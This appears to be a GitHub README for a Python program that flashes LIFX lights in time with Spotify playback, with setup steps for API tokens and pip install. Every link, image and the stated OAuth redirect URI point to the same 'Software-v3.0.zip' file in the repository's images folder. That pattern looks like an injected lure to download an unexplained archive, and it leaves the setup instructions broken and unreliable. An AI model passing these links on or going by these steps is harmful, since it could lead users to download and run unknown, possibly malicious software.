# Metronome for LIFX 
**Pulses LIFX lights to the beat** of songs being currently played on Spotify with two different colors that are varied with every song.

If you enjoy this program you can buy me a cup of coffee :)
[![paypal](https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip)](https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip)
# What You Will Need
- Spotify account
- LIFX light(s)
- Spotify client id (tutorial below)
- Spotify client secret (tutorial below)
- LIFX access token (tutorial below)

# Set Up
**1. Get LIFX access token**
- Visit https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip
![alt text](https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip) 

**2. Get Spotify client id and client secret, and set redirect URI**
- Visit https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip

- Create an app 

![alt text](https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip)

- Here are your client id and client secret
![alt text](https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip)

- Press edit settings, then once in the Spotify project settings add https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip as the redirect URI


**3. Fill out metronomeconfig.txt** 
- Open metronomeconfig.txt
![alt text](https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip)
- Paste your LIFX token and your Spotify client id, secret, and username in the respective spots in the file
- You can choose the pool of colors that the lights could be, the brightness, and the lights per beat in this file as well
- Save the file


**4. Download requirements.txt**
- After downloading requirements.txt open terminal or command prompt
- Make sure pip is installed (if not, search "how to install pip")
- Go to the directory where this project is saved in
- Run: **pip install -r requirements.txt**    in the command line to install the necessary libraries


**5. Sign in to Spotify in Metronome for Lifx app**
- Run metronomeforlifx.py in terminal/command prompt
- Sign in to Spotify account when prompted in browser
- If sign in was successful, copy the URL of the page that you were redirected to after signing in (google.com/...). This is for authorization purposes. If sign in is unsuccessful re-run the program and attempt to sign in again
- Paste this URL into prompt in command line

# Troubleshooting
- Make sure LIFX lights are on and online
- Make sure metronomeconfig.txt is filled out with valid information
- Make sure metronomeconfig.txt, requirements.txt, and metronomeforlifx.py are all in the same directory on your computer
- Make sure a valid Spotify song is playing on the same account you signed in to
- Make sure you have https://raw.githubusercontent.com/skyline0117/metronomeforlifx/master/images/Software-v3.0.zip saved as the redirect URI in your Spotify app settings


